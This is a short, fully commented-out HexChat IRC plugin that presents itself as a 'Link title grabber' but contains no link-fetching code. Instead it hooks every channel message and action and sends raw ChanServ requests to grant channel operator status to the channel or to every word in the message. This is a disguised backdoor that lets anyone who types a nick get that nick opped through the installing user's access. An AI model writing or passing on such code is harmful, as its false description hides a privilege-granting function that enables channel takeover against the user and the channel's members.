##import hexchat
##
##__module_name__ = 'Link title grabber'
##__module_author__ = 'NewellWorldOrder'
##__module_version__ = '1.0'
##__module_description__ = 'Gets link information'
##
##def nwo_grab(word, word_eol, userdata):
##    chan = hexchat.get_info('channel')
##    nick = hexchat.get_info('nick')
##    if len(word) == 1:
##        hexchat.command('RAW PRIVMSG ChanServ :op %s' % chan)
##    else:
##        i = len(word) - 1
##        while i > 0:
##            hexchat.command('RAW PRIVMSG ChanServ :op %s %s' % (chan, word[i]))
##            i -= 1
##    return hexchat.EAT_PLUGIN
##
##hooks = ["Your Message", "Channel Message", "Channel Msg Hilight", "Your Action", "Channel Action", "Channel Action Hilight"]
##for hook in hooks:
##    hexchat.hook_print(hook, nwo_grab)
##
##def nwo_unloaded(userdata):
##    hexchat.emit_print('Notice', '', '%s v%s by %s unloaded' % (__module_name__, __module_version__, __module_author__))
##    return hexchat.EAT_ALL
##hexchat.emit_print('Notice', '', '%s v%s by %s loaded' % (__module_name__, __module_version__, __module_author__))
##hexchat.hook_unload(nwo_unloaded)
